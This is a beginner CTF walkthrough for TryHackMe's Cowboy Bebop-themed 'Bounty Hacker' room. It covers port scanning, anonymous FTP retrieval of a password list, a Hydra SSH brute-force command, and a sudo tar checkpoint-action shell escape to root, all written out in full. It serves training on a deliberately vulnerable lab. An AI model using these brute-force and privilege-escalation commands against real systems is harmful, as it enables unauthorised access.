# Bounty Hacker

![Main Characters From Cowboy Bebop](./Assets/crew.jpg)

This [Cowboy Bebop](https://en.wikipedia.org/wiki/Cowboy_Bebop "Cowboy Bebop Wikipedia") themed room created by [Sevuhl](https://twitter.com/sevuhl "Sevuhls Twitter") is one of the many free [CTF's](https://en.wikipedia.org/wiki/Capture_the_flag_(cybersecurity) "CTF Wikipedia") available on the [TryHackMe](https://tryhackme.com "TryHackMe Website") website aimed at begginers.

---


## Deploy the machine.

Start the attack box or connect to TryHackMe via VPN. If you don't know how to connect with the VPN, check out the [OpenVPN room](https://tryhackme.com/room/openvpn "OpenVPN Room").

## Find open ports on the machine

Start by navigating to the website to check for connectivity or alternatively [ping](https://www.geeksforgeeks.org/ping-command-in-linux-with-examples/ "Ping Information") the IP.

> ping [IP Address]

Once we confirm the machine is up we can start a port scan using [nmap](https://www.freecodecamp.org/news/what-is-nmap-and-how-to-use-it-a-tutorial-for-the-greatest-scanning-tool-of-all-time/ "FreeCodeCamp Tutorial For NMAP") to see what services are running on the machine.

> nmap -A [IP Address]

The results of this nmap scan return three open ports (21, 22, 80) and the services they're currently running (ftp, ssh, http).

 But one of these sticks out and that is:

* 21/tcp open  ftp     vsftpd 3.0.3
    * ftp-anon: Anonymous FTP login allowed (FTP code 230)

[Port 21](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers "Wikipedia List Of Port Numbers And Services") is open and allows Anonymous login for the [FTP](https://www.linkedin.com/pulse/pentesting-exploiting-ftp-servers-kubotor "Article on FTP, and anonymous login") service.

Type the following command in your terminal and when it asks for your name use the word "**anonymous**"

> ftp [IP Address]

After logging in execute the following command to list all files in the directory:

```bash
ls -la
```

You should see the following output:

* -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
* -rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt

To download these to your current directory type:

> get locks.txt
>
> get task.txt

### [BACK TO TOP](#bounty-hacker "Top Of Page")

---

## Who wrote the task list?

Reading the [task.txt](./Assets/task.txt "task.txt file") file gives us the answer to this step.

> 1.) Protect Vicious.
>
> 2.) Plan for Red Eye pickup on the moon.
>
>-lin

### [BACK TO TOP](#bounty-hacker "Top Of Page")

---

## What service can you bruteforce with the text file found?

The other file we found ([locks.txt](./Assets/locks.txt "locks.txt")) looked like a password dictionary we could use for Lins SSH login.

> rEddrAGON
>
> ReDdr4g0nSynd!cat3
>
> Dr@gOn$yn9icat3
>
> R3DDr46ONSYndIC@Te
>
> ReddRA60N
>
> R3dDrag0nSynd1c4te
>
> dRa6oN5YNDiCATE
>
> ReDDR4g0n5ynDIc4te
>
> R3Dr4gOn2044
>
> RedDr4gonSynd1cat3
>
> R3dDRaG0Nsynd1c@T3
>
> Synd1c4teDr@g0n
>
> reddRAg0N
>
> REddRaG0N5yNdIc47e
>
> Dra6oN$yndIC@t3
>
> 4L1mi6H71StHeB357
>
> rEDdragOn$ynd1c473
>
> DrAgoN5ynD1cATE
>
> ReDdrag0n$ynd1cate
>
> Dr@gOn$yND1C4Te
>
> RedDr@gonSyn9ic47e
>
> REd$yNdIc47e
>
> dr@goN5YNd1c@73
>
> rEDdrAGOnSyNDiCat3
>
> r3ddr@g0N
>
> ReDSynd1ca7e


Executing the following command in your terminal will [bruteforce the SSH](https://www.linuxfordevices.com/tutorials/linux/hydra-brute-force-ssh "Article On SSH Brute Force") password for Lin using [Hydra](https://en.wikipedia.org/wiki/Hydra_(software) "Hydra Wikipedia").

> hydra -l lin -P [path/to/wordlist] [IP ADDRESS] ssh


## What is the users password?

Use the [locks.txt](./Assets/locks.txt "Password Dictionary") file as the wordlist to Hydra. Brute force the SSH with "lin" as the username.

### [BACK TO TOP](#bounty-hacker "Top Of Page")

---

## user.txt

Once you have the password SSH into lins account.

> ssh lin@[IP Address]

Execute the following commands to list all files within the current directory.

```bash
ls -la
```

You should see the following output:

* drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .
* drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..
* -rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt

Use the cat command to read the user.txt file where you'll find the flag.

```bash
cat user.txt
```

### [BACK TO TOP](#bounty-hacker "Top Of Page")

---

## root.txt

Now that we're in the system we need to escalate our priviliges to gain access to root and find the last flag.

We can start by checking if the current user (lin) has any sudo priviliges. This can be done with the following command:

```bash
sudo -l
```

Which returns the following:

* User lin may run the following commands on bountyhacker:
    * (root) /bin/tar

Looking up the [tar binary on GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo "GTFOBins Tar Entry") we see the following command for getting root privilege:

"**sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh**"

You should now be root. Verify this by using the following command:

```bash
whoami
```

Now to finish the room, run the following commands to find and read the flag file:

```bash
ls -la /root
cat /root/root.txt
```

Breaking this down-

If we lookup the help file on tar:

```bash
tar --help
```

We can find out what the -cf flag does:

> tar -cf archive.tar foo bar  # Create archive.tar from files foo and bar.

What the --checkpoint=1 flag does:

> --checkpoint[=NUMBER]  display progress messages every NUMBERth record (default 10)

And finally what the --checkpoint-action-=exec=/bin/sh flag does:

> --checkpoint-action=ACTION   execute ACTION on each checkpoint

We're using [tar](https://linuxhint.com/what-is-tar-file/ "Article On Tar Files") as sudo to create a tar from [/dev/null](https://linuxhint.com/what_is_dev_null/ "Article On Using /dev/null") to /dev/null and using the checkpoint action to [exec](https://phoenixnap.com/kb/linux-exec "Article On The Linux Exec Command") a shell and maintain the privilige.

---

### [BACK TO TOP](#bounty-hacker "Top Of Page")